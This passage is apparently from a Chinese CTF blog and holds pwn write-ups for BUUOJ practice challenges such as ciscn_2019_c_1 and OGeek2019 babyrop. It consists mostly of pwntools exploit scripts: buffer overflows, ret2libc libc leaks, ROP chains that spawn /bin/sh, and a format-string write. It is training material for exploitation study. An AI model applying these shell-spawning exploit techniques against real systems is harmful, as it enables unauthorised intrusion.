class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28698</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn1_sctf_2016")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'I'</span>*<span class="number">20</span> + <span class="string">b'A'</span>*<span class="number">0x4</span> + p32(<span class="number">0x08048F0D</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>浮点数在内存中的存储</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">float a &#x3D; 11.28125;</span><br><span class="line">unsigned char* p &#x3D;  (unsigned char*)&amp;a;</span><br><span class="line">printf(&quot;0x%x %x %x %x&quot;,*(p+3),*(p+2),*(p+1),*(p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29611</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x2c</span>) + <span class="string">"\x00\x80\x34\x41"</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="第六章-CTF之PWN章-stack"><a href="#第六章-CTF之PWN章-stack" class="headerlink" title="[第六章 CTF之PWN章]stack"></a>[第六章 CTF之PWN章]stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26846</span>)</span><br><span class="line"><span class="comment">#r = process("./stack")</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0xA</span>+<span class="number">0x8</span>) + p64(<span class="number">0x400537</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="第六章-CTF之PWN章-ROP（64位系统调用）"><a href="#第六章-CTF之PWN章-ROP（64位系统调用）" class="headerlink" title="[第六章 CTF之PWN章]ROP（64位系统调用）"></a>[第六章 CTF之PWN章]ROP（64位系统调用）</h2><p>64位的系统调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p&#x3D;process(&#39;.&#x2F;rop&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;rop&#39;)</span><br><span class="line">libc &#x3D; elf.libc</span><br><span class="line">pop_rdi &#x3D; 0x4005d3</span><br><span class="line">puts_got &#x3D; 0x601018</span><br><span class="line">puts &#x3D; 0x400430</span><br><span class="line">main &#x3D; 0x400537</span><br><span class="line">rop1 &#x3D; &quot;a&quot;*18</span><br><span class="line">rop1 +&#x3D; p64(pop_rdi)</span><br><span class="line">rop1 +&#x3D; p64(puts_got)</span><br><span class="line">rop1 +&#x3D; p64(puts)</span><br><span class="line">rop1 +&#x3D; p64(main)</span><br><span class="line">p.sendline(rop1)</span><br><span class="line">p.recvuntil(&#39;\n&#39;)</span><br><span class="line">addr &#x3D; u64(p.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">libc_base &#x3D; addr - libc.symbols[&#39;puts&#39;]</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">pop_rax &#x3D; 0x00000000000439c8 + libc_base</span><br><span class="line">pop_rdi &#x3D; 0x000000000002155f + libc_base</span><br><span class="line">pop_rsi &#x3D; 0x0000000000023e6a + libc_base</span><br><span class="line">pop_rdx &#x3D; 0x0000000000001b96 + libc_base</span><br><span class="line">syscall &#x3D; 0x00000000000d2975 + libc_base</span><br><span class="line">binsh   &#x3D; next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;),) + libc_base</span><br><span class="line">rop2 &#x3D; &quot;a&quot;*18</span><br><span class="line">rop2 +&#x3D; p64(pop_rax)</span><br><span class="line">rop2 +&#x3D; p64(59)</span><br><span class="line">rop2 +&#x3D; p64(pop_rdi)</span><br><span class="line">rop2 +&#x3D; p64(binsh)</span><br><span class="line">rop2 +&#x3D; p64(pop_rsi)</span><br><span class="line">rop2 +&#x3D; p64(0)</span><br><span class="line">rop2 +&#x3D; p64(pop_rdx)</span><br><span class="line">rop2 +&#x3D; p64(0)</span><br><span class="line">rop2 +&#x3D; p64(syscall)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&quot;hello\n&quot;)</span><br><span class="line">p.sendline(rop2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,28426)</span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;libc-2.271.so&quot;)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;rop&quot;)</span><br><span class="line">puts_plt &#x3D; elf.symbols[&quot;puts&quot;]</span><br><span class="line">pop_rdi &#x3D; 0x4005d3</span><br><span class="line">ret &#x3D; 0x400416</span><br><span class="line">puts_got &#x3D; elf.got[&quot;puts&quot;]</span><br><span class="line">ru(&#39;hello\n&#39;)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x400537)</span><br><span class="line">sl(payload)</span><br><span class="line">puts &#x3D; u64(p.recv(6).ljust(8, &#39;\x00&#39;))</span><br><span class="line">leak(&quot;puts&quot;,puts)</span><br><span class="line">libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]</span><br><span class="line">sys &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">bin_sh &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class="line"># libc &#x3D; LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line"># libc_base &#x3D; puts - libc.dump(&quot;puts&quot;)</span><br><span class="line"># sys &#x3D; libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line"># bin_sh &#x3D; libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rdi) + p64(bin_sh) +p64(ret)+ p64(sys)</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line"># pop_rax &#x3D; 0x00000000000439c8 + libc_base</span><br><span class="line"># pop_rdi &#x3D; 0x000000000002155f + libc_base</span><br><span class="line"># pop_rsi &#x3D; 0x0000000000023e6a + libc_base</span><br><span class="line"># pop_rdx &#x3D; 0x0000000000001b96 + libc_base</span><br><span class="line"># syscall &#x3D; 0x00000000000d2975 + libc_base</span><br><span class="line"># payload &#x3D; b&#39;A&#39;*(0xa+0x8) + p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(bin_sh) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">r &#x3D; remote(&quot;node3.buuoj.cn&quot;,29477)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;A&#39;*(0x88) + p64(0x400596)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1（64位的puts泄露）"><a href="#ciscn-2019-c-1（64位的puts泄露）" class="headerlink" title="ciscn_2019_c_1（64位的puts泄露）"></a>ciscn_2019_c_1（64位的puts泄露）</h2><p>本地可以打通</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29957</span>)</span><br><span class="line">p = process(<span class="string">"./pwn3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">puts_addr = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your choice!\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_addr)+p64(encrypt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts=u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,puts-libc.symbols[<span class="string">'puts'</span>])</span><br><span class="line">libc_base = puts-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh_addr = libc_base + next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">print(next(libc.search(<span class="string">"/bin/sh"</span>)))</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>太废物了</p><p>后来看了题解原来是18上面</p><p>用libcsearcher</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">'linux'</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">ru=<span class="keyword">lambda</span> x:p.recvuntil(x)</span><br><span class="line">rl=<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sl=<span class="keyword">lambda</span> x:p.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27415</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn3")</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">encrypt = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sla(<span class="string">"Input your choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">ru(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">rl()</span><br><span class="line">rl()</span><br><span class="line">puts = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,puts)</span><br><span class="line">print(libc)</span><br><span class="line">libc_base = puts-libc.dump(<span class="string">"puts"</span>)</span><br><span class="line">log.info(<span class="string">"libc base 0x%x"</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload2=<span class="string">b'A'</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line">sl(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>这里需要注意</p><p>18的ubuntu执行system会进行堆栈平衡</p><p>解决办法是加ret指令</p></blockquote><h2 id="OGeek2019-babyrop（32位puts泄露）"><a href="#OGeek2019-babyrop（32位puts泄露）" class="headerlink" title="[OGeek2019]babyrop（32位puts泄露）"></a>[OGeek2019]babyrop（32位puts泄露）</h2><p>打通</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class="line">rl&#x3D;lambda :p.recvline()</span><br><span class="line">sl&#x3D;lambda x:p.sendline(x)</span><br><span class="line">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29517)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">payload &#x3D; b&#39;\x00&#39;*7 + b&#39;\xff&#39;</span><br><span class="line">main &#x3D; 0x8048825</span><br><span class="line">sl(payload)</span><br><span class="line">puts_plt &#x3D; elf.symbols[&#39;puts&#39;]</span><br><span class="line">puts_got &#x3D; elf.got[&#39;puts&#39;]</span><br><span class="line">payload2 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(0x08048548) + p32(main) + p32(0x8049fd4)</span><br><span class="line">sla(&quot;Correct\n&quot;,payload2)</span><br><span class="line">puts &#x3D; u32(p.recv(4))</span><br><span class="line">log.info(&quot;libc base 0x%x&quot;,puts-libc.symbols[&#39;puts&#39;])</span><br><span class="line">libc_base &#x3D; puts-libc.symbols[&#39;puts&#39;]</span><br><span class="line">system_addr &#x3D; libc_base + libc.symbols[&#39;system&#39;]</span><br><span class="line">bin_sh_addr &#x3D; libc_base + next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class="line">sl(payload)</span><br><span class="line">payload3 &#x3D; b&#39;A&#39;*(0xe7+0x4) + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)</span><br><span class="line">sla(&quot;Correct\n&quot;,payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="第五空间2019-决赛-PWN5（格式化字符串漏洞）"><a href="#第五空间2019-决赛-PWN5（格式化字符串漏洞）" class="headerlink" title="[第五空间2019 决赛]PWN5（格式化字符串漏洞）"></a>[第五空间2019 决赛]PWN5（格式化字符串漏洞）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru&#x3D;lambda x:p.recvuntil(x)</span><br><span class="line">rl&#x3D;lambda :p.recvline()</span><br><span class="line">sl&#x3D;lambda x:p.sendline(x)</span><br><span class="line">sla&#x3D;lambda x,y:p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&quot;&quot;)</span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27812)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;pwn&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">payload &#x3D; p32(0x804C044) + &quot;aaaa%10$n&quot;</span><br><span class="line">sl(payload)</span><br><span class="line">#print(p.recv())</span><br><span class="line">sl(b&#39;8&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BJDCTF-2nd-r2t3"><a href="#BJDCTF-2nd-r2t3" class="headerlink" title="[BJDCTF 2nd]r2t3"></a>[BJDCTF 2nd]r2t3</h2><p>一开始准备\x00发现不可以</p><blockquote><p>unsigned __int8:表示无符号一个字节</p><p>那么这里就可以溢出了，可以看下面这个eg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">&gt;int main()</span><br><span class="line">&gt;&#123;</span><br><span class="line">char a &#x3D; 0x100;</span><br><span class="line">printf(&quot;%d\n&quot;,a-1);</span><br><span class="line">printf(&quot;%d\n&quot;,a);</span><br><span class="line">printf(&quot;%d&quot;,a+1);</span><br><span class="line">&gt;&#125;</span><br><span class="line">&gt;输出结果为 -1 0 1</span><br></pre></td></tr></table></figure><p>为什么中间是0呢？</p><p>因为char是1字节，最大为0xff也就是-1，</p><p>继续加+1，就是0x100，已经超过0xff，就会丢弃，变成0</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\0&#39;))</span><br><span class="line">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29806)</span><br><span class="line">#p &#x3D; process(&quot;.&#x2F;r2t3&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;r2t3&quot;)</span><br><span class="line">libc &#x3D; ELF(&#39;.&#x2F;libc-2.23.so&#39;)</span><br><span class="line">ret &#x3D; 0x080483be</span><br><span class="line">main &#x3D; 0x804863b</span><br><span class="line">system &#x3D; 0x804858b</span><br><span class="line">payload &#x3D; b&#39;A&#39;*0x15  + p32(system)</span><br><span class="line">payload &#x3D; payload.ljust(260,b&#39;A&#39;)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><blockquote><p>好家伙,这题真是开眼了</p></blockquote><p>先说第一种方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os&#x3D;&#39;linux&#39;</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class="line">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class="line">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class="line">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class="line">itr     &#x3D; lambda                    :p.interactive()</span><br><span class="line">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\0&#39;))</span><br><span class="line">uu64    &#x3D; lambda data               